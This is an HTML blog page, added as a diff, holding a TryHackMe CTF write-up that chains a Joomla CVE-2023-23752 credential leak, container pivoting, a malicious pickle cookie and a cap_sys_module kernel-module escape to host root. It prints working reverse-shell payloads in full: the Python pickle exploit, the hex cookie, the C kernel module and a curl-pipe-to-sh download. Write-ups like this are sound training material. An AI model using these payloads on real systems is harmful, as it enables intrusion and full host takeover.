@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Voyage | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — Joomla CVE-2023-23752 API credential leak, SSH into Container 1, internal network discovery, SSH port forwarding to hidden Flask app, insecure pickle deserialization RCE, cap_sys_module kernel module escape to host root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/voyage.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/voyage.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Voyage">
+<meta property="og:description" content="TryHackMe CTF — Joomla CVE-2023-23752 API credential leak, Docker container pivot, pickle deserialization RCE, kernel module escape to host root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Voyage">
+<meta name="twitter:description" content="TryHackMe CTF — Joomla CVE-2023-23752 API credential leak, Docker container pivot, pickle deserialization RCE, kernel module escape to host root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Voyage</h1>
+    <div class="post-description">TryHackMe CTF. Sometimes in a pentest, you get root access very quickly. But is it the real root or just a container? The voyage might still be going on.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>The small bit of information here alludes to Docker priv-esc. Let&rsquo;s keep the scope wide in case we&rsquo;re being red-herringed.</p>
+
+<hr>
+
+<h2>Recon</h2>
+
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.144.155.74</code></pre>
+
+<p>Very interesting highlights from the detailed Nmap&hellip;</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 7.28.48 AM.png" alt="nmap vuln scan output part 1" style="max-width:100%;margin:2rem 0;">
+
+
+
+
+<p>I rearranged the output screenshots a bit to make sure this one is last.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 7.31.38 AM.png" alt="nmap vuln scan final output" style="max-width:100%;margin:2rem 0;">
+
+<p>This is almost too many goldmines.</p>
+
+<p>What we know so far:</p>
+
+<p><strong>Open Ports:</strong> 22, 80, 2222.</p>
+<p><strong>Potential subdomains:</strong></p>
+<ul>
+<li><code>/administrator/</code></li>
+<li><code>/administrator/index.php</code></li>
+<li><code>htaccess.txt</code>: Joomla!</li>
+<li><code>README.txt</code></li>
+<li><code>/cache/</code></li>
+<li><code>/images/</code></li>
+<li><code>/includes/</code></li>
+<li><code>/modules/</code></li>
+<li><code>/templates/</code></li>
+<li><code>/tm/</code></li>
+</ul>
+
+<p><strong>Potential exploits:</strong></p>
+
+<table>
+<tr><td><strong>Path</strong>: <code>http://10.144.155.74:80/</code> &mdash; Form id: <code>login-form-16</code> &mdash; Form action: <code>/index.php</code></td></tr>
+<tr><td><strong>Path</strong>: <code>http://10.144.155.74:80/index.php/component/users/remind?Itemid=101</code> &mdash; Form id: <code>user-registration</code></td></tr>
+<tr><td><strong>Path</strong>: <code>http://10.144.155.74:80/index.php/component/users/reset?Itemid=101</code> &mdash; Form id: <code>user-registration</code></td></tr>
+</table>
+
+<p>That&rsquo;s quite a bit to start with.</p>
+
+<p>Let&rsquo;s do a quick confirmation on the open ports and running services with a less vuln-oriented scan:</p>
+
+<pre><code>nmap -p- -sV -sC 10.144.155.74</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 7.51.11 AM.png" alt="nmap service version scan confirming ports" style="max-width:100%;margin:2rem 0;">
+
+<p>I do love hacking some Joomla. Ports and services confirmed.</p>
+
+<p>Time to pay a visit in-browser.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 7.43.59 AM.png" alt="Joomla Cassiopeia default template in browser" style="max-width:100%;margin:2rem 0;">
+
+<p>Cassiopeia is the default Joomla 4.x template, but let&rsquo;s stop to appreciate the history lesson.</p>
+
+<p>Cassiopeia is rooted in Greek Mythology. Queen of the mythological Phoenician realm of Ethiopia. Mother of Andromeda. Wife of King Cepheus. Placed in the sky by Poseidon as a constellation. She&rsquo;s frequently known and depicted as the &ldquo;Enthroned Woman.&rdquo;</p>
+
+<p>It&rsquo;s also the name of a quite literal constellation. Cassiopeia in Greek means &ldquo;she whose words excel.&rdquo;</p>
+
+<p>Well, I am not such a big fan of spreadsheets, so this better focus on the Joomla and beyond.</p>
+
+<p><strong>Updated &ldquo;What We Know&rdquo; list:</strong></p>
+<ul>
+<li>We are working with Joomla CMS</li>
+<li>The <code>robots.txt</code> is a Joomla fingerprint</li>
+<li>Two open SSH ports: 22 and 2222 are suggestive of two different environments, aka a container</li>
+<li>Port 80 is open</li>
+<li>Server: Apache 2.4.58 on Ubuntu</li>
+</ul>
+
+<hr>
+
+<h2>Joomla Enumeration</h2>
+
+<p>For Joomla enum, we want to find the exact version, map out the attack surface by way of recently installed extensions or plugins, as well as find any other available user enumeration hits.</p>
+
+<pre><code>joomscan -u http://10.144.155.74</code></pre>
+
+<p>While <code>joomscan</code> runs, we&rsquo;ll also run a <code>curl</code> to directly check the version:</p>
+
+<pre><code>curl http://10.144.155.74/administrator/manifests/files/joomla.xml</code></pre>
+
+<p>The <code>curl</code> returns deja vu along with the output:</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 8.06.02 AM.png" alt="curl joomla.xml returning version 4.2" style="max-width:100%;margin:2rem 0;">
+
+<p>If I&rsquo;m not mistaken, I recently exploited Joomla CVE-2023-23752: Unauthenticated API endpoint leaking DB credentials.</p>
+
+<p>Let&rsquo;s review the Joomscan, and then we&rsquo;ll run a <code>searchsploit</code> on the Joomla version number, 4.2:</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 8.09.21 AM.png" alt="joomscan output saying not vulnerable" style="max-width:100%;margin:2rem 0;">
+
+<p>Nice try, JoomScan. &ldquo;Not vulnerable&rdquo; output is from a 2018 signature base. We know that&rsquo;s not up to date.</p>
+
+<p>Let&rsquo;s &lsquo;sploit it.</p>
+
+<pre><code>searchsploit joomla 4.2</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 8.12.27 AM.png" alt="searchsploit results for joomla 4.2 showing CVE-2023-23752" style="max-width:100%;margin:2rem 0;">
+
+<p>We want the very last one in the exploit list: Unauthenticated information disclosure.</p>
+
+<hr>
+
+<h2>CVE-2023-23752: API Credential Leak</h2>
+
+<p>The <code>robots.txt</code> is trying (and failing) to hide the <code>/api/</code> path. Let&rsquo;s take a looksy&hellip;</p>
+
+<pre><code>curl http://10.144.155.74/api/index.php/v1/config/application?public=true</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 8.19.12 AM.png" alt="curl API endpoint leaking plaintext DB credentials" style="max-width:100%;margin:2rem 0;">
+
+<p>&ldquo;Not vulnerable,&rdquo; they said (laughs in evil villain).</p>
+
+<p>To deliver in a more professional context, these are plaintext root credentials:</p>
+<ul>
+<li>User: <code>root</code></li>
+<li>Password: <code>RootPassword@1234</code></li>
+<li>DB: <code>joomla_db</code></li>
+</ul>
+
+<p>As promised and delivered by CVE-2023-23752, the API endpoint hath leaked the credentials.</p>
+
+<p>Time to visit <code>TARGET_IP/administrator</code>.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 8.27.57 AM.png" alt="Joomla administrator login page" style="max-width:100%;margin:2rem 0;">
+
+<p>We have the <code>root</code> user login, but that&rsquo;s not necessarily the Joomla admin credential combo. Let&rsquo;s try a brute-force with <code>admin:admin</code>.</p>
+
+
+<p>Joomla, you were already telling me too much. Now you&rsquo;re just drunk and loud.</p>
+
+<p>I don&rsquo;t have all day to brute-force in analog. We can leverage the CVE further by checking additional API routes for leaked goodness. The improper authentication-less access check spans config, users, and more.</p>
+
+<pre><code>curl http://10.144.155.74/api/index.php/v1/users?public=true</code></pre>
+
+
+<p>Much better. Highlighted, we have:</p>
+<ul>
+<li>Username: <code>root</code></li>
+<li>Email: <code>mail@tourism.thm</code></li>
+<li>Best guess at a password: <code>RootPassword@1234</code></li>
+</ul>
+
+<p>At the end of the first <code>curl</code> output, we can see that there are 3 other pages (4 total) to examine:</p>
+
+
+<p>Let&rsquo;s see what else we can unearth. Use the URL-encoded version here or <code>curl</code> will interpret the brackets as a range expression.</p>
+
+<pre><code>curl "http://10.144.155.74/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20"
+curl "http://10.144.155.74/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=40&amp;page%5Blimit%5D=20"
+curl "http://10.144.155.74/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20"</code></pre>
+
+
+<p>Holy configuration details.</p>
+
+
+<p>On the page 2 <code>curl</code>, at the beginning and end of the highlighted area, we can see a Joomla application secret key <code>gJ48pkrbAgOwhNgn</code> and the <code>mail@tourism.thm</code> email.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 8.55.15 AM.png" alt="page 3 curl showing /var/www/html document root and SMTP port 25" style="max-width:100%;margin:2rem 0;">
+
+<p>On page 3, the <code>/var/www/html</code> is the default Apache document root, which is the path a Joomla docker container image would use. Since the synopsis alluded to a Docker/container, heavily noted. I also see SMTP being served over Port 25 in the same output.</p>
+
+
+<hr>
+
+<h2>SSH into Container 1</h2>
+
+<p>Our Nmap scans both pointed to Port 22 and Port 2222 running SSH. Let&rsquo;s try the obvious.</p>
+
+<pre><code>ssh root@10.144.155.74 -p 2222</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 9.47.19 AM.png" alt="SSH login successful as root on port 2222" style="max-width:100%;margin:2rem 0;">
+
+<p>Rooted and pwned. First:</p>
+
+<pre><code>whoami
+hostname</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 9.48.23 AM.png" alt="whoami returns root, hostname returns f5eb774507f2" style="max-width:100%;margin:2rem 0;">
+
+<p><code>root</code> and <code>f5eb774507f2</code> noted.</p>
+
+<p>Let&rsquo;s investigate the Docker situation:</p>
+
+<pre><code>ls /.dockerenv</code></pre>
+
+<p>We are confirmed inside of container numero uno.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 9.50.05 AM.png" alt="/.dockerenv exists confirming we are inside a Docker container" style="max-width:100%;margin:2rem 0;">
+
+<p>We need to feel out our surroundings.</p>
+
+<pre><code>ip a</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 9.51.47 AM.png" alt="ip a showing container IP 192.168.100.10/24" style="max-width:100%;margin:2rem 0;">
+
+<p><code>192.168.100.10/24</code> is our container&rsquo;s IP and CIDR notation. Let&rsquo;s see if we can Nmap our way around with this new information:</p>
+
+<pre><code>nmap 192.168.100.0/24</code></pre>
+
+
+<p>Things are getting spicy.</p>
+<ul>
+<li><code>192.168.100.1</code> is the Docker host aka our original target. Now that we&rsquo;re inside, ports 22/80/2222/5000 are all visible.</li>
+<li><code>192.168.100.10</code> is us now in Container 1</li>
+<li><code>192.168.100.12</code> is Container 2 <code>voyage_priv2</code> on port 5000, which we know is not externally exposed.</li>
+</ul>
+
+<p>We&rsquo;ll target Port 5000 next for priv-esc-ability. Port 5000 is commonly used as a default port for local development servers, particularly for Python Flask applications.</p>
+
+<pre><code>curl http://192.168.100.12:5000</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 9.59.59 AM.png" alt="curl port 5000 returning Tourism Secret Finance Panel" style="max-width:100%;margin:2rem 0;">
+
+<p>The &ldquo;Tourism Secret Finance Panel&rdquo; appears to be a dev panel.</p>
+
+<hr>
+
+<h2>SSH Port Forwarding to Container 2</h2>
+
+<p>We could interact with it from inside the container, but let&rsquo;s go easy on ourselves and use our browser to set up a tunnel first. In a new/different terminal:</p>
+
+<pre><code>ssh -L 5000:192.168.100.12:5000 -p 2222 root@10.144.155.74 -N</code></pre>
+
+<p>It will seem like it&rsquo;s hanging because the <code>-N</code> flag holds the tunnel open. If you see this, you&rsquo;re good to move forward:</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.07.07 AM.png" alt="SSH tunnel hanging as expected with -N flag" style="max-width:100%;margin:2rem 0;">
+
+<p>Now we visit <code>http://127.0.0.1:5000</code> in our browser.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.08.50 AM.png" alt="Tourism Secret Finance Panel login page in browser" style="max-width:100%;margin:2rem 0;">
+
+<p>Our tunnel is working. Let&rsquo;s try <code>admin:admin</code>&hellip;</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.10.05 AM.png" alt="Flask app login successful with admin:admin" style="max-width:100%;margin:2rem 0;">
+
+<p>Brute force success on the first, albeit obvious, attempt!</p>
+
+<hr>
+
+<h2>Operation Malicious Pickle</h2>
+
+<p>Since this is confirmed a Port 5000 Python/Flask app, Flask has to maintain its session somewhere. That somewhere is likely cookies. Flask&rsquo;s default session cookie is usually <code>pickle</code> when devs roll out their own because it&rsquo;s easy AF to serialize Python objects.</p>
+
+<p>Let&rsquo;s peek into the cookie jar. Inspect/Browser tools (F12) &gt; Session &gt; Cookies &gt; and here&rsquo;s our session cookie:</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.17.10 AM.png" alt="browser devtools showing hex-encoded session cookie" style="max-width:100%;margin:2rem 0;">
+
+<p>The session cookie is:<br>
+<code>80049526000000000000007d94288c0475736572948c0561646d696e948c07726576656e7565948c05383530303094752e</code></p>
+
+<p>The <code>8004</code> at the beginning is classic pickle. Those are the 4 magic bytes. This is definitely hex-encoded, serialized Python pickle data.</p>
+
+<p>First, we must decode before we weaponize. In a new terminal:</p>
+
+<pre><code>python3 -c "
+import binascii, pickle
+cookie = '80049526000000000000007d94288c0475736572948c0561646d696e948c07726576656e7565948c05383530303094752e'
+print(pickle.loads(binascii.unhexlify(cookie)))
+"</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.21.36 AM.png" alt="decoded pickle cookie showing user admin revenue 85000" style="max-width:100%;margin:2rem 0;">
+
+<p><code>{'user': 'admin', 'revenue': '85000'}</code></p>
+
+<p>Not encrypted, not signed, no integrity&mdash;just a server fully trusting whatever pickle data sent its way.</p>
+
+<p>It&rsquo;s time for: <strong>Operation Malicious Pickle.</strong></p>
+
+<p>Steps:</p>
+<ol>
+<li>Start a listener on Port 4444</li>
+<li>Create our <code>operation_malicious_pickle.py</code> script</li>
+<li>Watch our malicious payload print in the listener, then&hellip;</li>
+<li>Inject it</li>
+</ol>
+
+<p>Step 1 &mdash; fresh terminal:</p>
+
+<pre><code>nc -lvnp 4444</code></pre>
+
+<p>Step 2:</p>
+
+<pre><code>cat &gt; operation_malicious_pickle.py &lt;&lt; 'EOF'
+import pickle
+import binascii
+import os
+
+class Exploit:
+    def __reduce__(self):
+        cmd = "bash -i &gt;&amp; /dev/tcp/192.168.128.19/4444 0&gt;&amp;1"
+        return (__import__("subprocess").Popen, (["bash", "-c", cmd],))
+
+payload = pickle.dumps(Exploit())
+print(binascii.hexlify(payload).decode())
+EOF
+python3 operation_malicious_pickle.py</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.32.15 AM.png" alt="operation_malicious_pickle.py output showing hex payload" style="max-width:100%;margin:2rem 0;">
+
+<p>And now we have our hex to craft. Make sure the listener is doing its job, then:</p>
+
+<pre><code>curl -H "Cookie: session_data=8004955b000000000000008c0a73756270726f63657373948c05506f70656e9493945d94288c0462617368948c022d63948c2c62617368202d69203e26202f6465762f7463702f3139322e3136382e3132382e31392f3434343420303e26319465859452942e" http://127.0.0.1:5000/</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.33.39 AM.png" alt="curl injecting malicious pickle cookie" style="max-width:100%;margin:2rem 0;">
+
+<p>Oh yeahhh. We are in Container 2. Let&rsquo;s grab Flag 1:</p>
+
+<pre><code>cat /root/user.txt</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.34.57 AM.png" alt="user.txt flag captured from Container 2" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>LinPEAS: Escaping Container 2</h2>
+
+<p>Now we need to escape the host. We need to run LinPEAS to surmise how to escape. We first need to see if <code>curl</code> or <code>wget</code> is installed on Container 2.</p>
+
+<pre><code>which curl wget</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.38.31 AM.png" alt="which curl wget showing wget is available" style="max-width:100%;margin:2rem 0;">
+
+<p>Score. <code>wget</code> is available. Let&rsquo;s <code>curl</code> LinPEAS on verbose mode.</p>
+
+<pre><code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></pre>
+
+<p>The container has zero outbound internet access.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.46.59 AM.png" alt="curl to github failing due to no outbound internet" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;ll transfer it from our native terminal via an HTTP server on 8080 instead. Back in a terminal window (not a shell):</p>
+
+<pre><code>cd /usr/share/peass/linpeas &amp;&amp; python3 -m http.server 8080</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.51.49 AM.png" alt="python3 http.server running on port 8080" style="max-width:100%;margin:2rem 0;">
+
+<p>Now jump back over to Container 2, and pull the connection from your IP&rsquo;s http server being served on 8080:</p>
+
+<pre><code>curl http://192.168.128.19:8080/linpeas.sh | sh</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.49.55 AM.png" alt="LinPEAS running inside Container 2" style="max-width:100%;margin:2rem 0;">
+
+<p>Hello, friendly little pea. Let it run. It may take a few minutes in the container environment.</p>
+
+<p>So glad LinPEAS is color coded. After a few minutes of sifting, the <code>Dangerous Capabilities</code> section caught and held my attention.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.57.16 AM.png" alt="LinPEAS Dangerous Capabilities showing cap_sys_module" style="max-width:100%;margin:2rem 0;">
+
+<p><code>cap_sys_module</code> is our precious find.</p>
+
+<p>Bonus points for our <code>/root</code> directory listing:</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 10.59.03 AM.png" alt="/root directory listing showing revshell kernel module artifacts" style="max-width:100%;margin:2rem 0;">
+
+<p>Our <code>/root</code> listings are:</p>
+<pre><code>.revshell.ko.cmd
+.revshell.mod.cmd
+.revshell.mod.o.cmd
+.revshell.o.cmd</code></pre>
+
+<p>Whoever created this left a guide of what to do.</p>
+
+<p>Here&rsquo;s the final pieces of the puzzle that we can use to build our kernel module exploit.</p>
+
+
+<hr>
+
+<h2>cap_sys_module: Kernel Module Escape</h2>
+
+<p>Let&rsquo;s build. Start another listener in a fresh terminal:</p>
+
+<pre><code>nc -lvnp 1234</code></pre>
+
+<p>Head back to Container 2 to create a working directory and kernel module source:</p>
+
+<pre><code>mkdir /tmp/escape &amp;&amp; cd /tmp/escape</code></pre>
+
+<pre><code>cat &gt; revshell.c &lt;&lt; 'EOF'
+#include &lt;linux/kmod.h&gt;
+#include &lt;linux/module.h&gt;
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Exploit");
+MODULE_DESCRIPTION("Reverse shell module");
+MODULE_VERSION("1.0");
+char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.128.19/1234 0&gt;&amp;1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+EOF</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 11.07.08 AM.png" alt="revshell.c kernel module source written to /tmp/escape" style="max-width:100%;margin:2rem 0;">
+
+<p>Still in Container 2:</p>
+
+<pre><code>cat &gt; Makefile &lt;&lt; 'EOF'
+obj-m +=revshell.o
+all:
+	make -C /lib/modules/$(uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(uname -r)/build M=$(PWD) clean
+EOF</code></pre>
+
+<p>And lastly, compile:</p>
+
+<pre><code>make</code></pre>
+
+<p>Hit enter, and turn your eyes to the listener on Port 1234.</p>
+
+<p>If you get a missing separator error in Container 2, type this, then <code>make</code> again and enter once more:</p>
+
+<pre><code>printf 'obj-m +=revshell.o\nall:\n\tmake -C /usr/src/linux-headers-6.8.0-1030-aws M=$(PWD) modules\nclean:\n\tmake -C /usr/src/linux-headers-6.8.0-1030-aws M=$(PWD) clean\n' &gt; Makefile</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 11.10.57 AM.png" alt="make compiling the kernel module" style="max-width:100%;margin:2rem 0;">
+
+<p>Run this last one, and then&hellip;</p>
+
+<pre><code>insmod revshell.ko</code></pre>
+
+<p>Eyes on the listener:</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 11.12.14 AM.png" alt="listener receiving reverse shell from kernel module" style="max-width:100%;margin:2rem 0;">
+
+<p>ROOT.</p>
+
+<p>We are OUT of the Docker thanks to kernel module abuse and we are now on the host as root.</p>
+
+<pre><code>cat /root/root.txt</code></pre>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 11.12.57 AM.png" alt="root.txt flag captured on host" style="max-width:100%;margin:2rem 0;">
+
+<p>WOOOOOOO.</p>
+
+<img src="/images/voyage/Screenshot 2026-05-14 at 11.13.26 AM.png" alt="final celebration screenshot" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<ol>
+<li><strong>CVE-2023-23752</strong> &mdash; Joomla API leaks DB creds</li>
+<li><strong>Credential reuse</strong> &mdash; SSH into Container 1 on port 2222</li>
+<li><strong>Internal network discovery</strong> &mdash; found Container 2 at <code>192.168.100.12:5000</code></li>
+<li><strong>SSH port forwarding</strong> &mdash; tunneled to hidden Flask app</li>
+<li><strong>Insecure pickle deserialization</strong> &mdash; RCE on Container 2, user flag</li>
+<li><strong><code>cap_sys_module</code></strong> &mdash; kernel module escape to host root, root flag</li>
+</ol>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
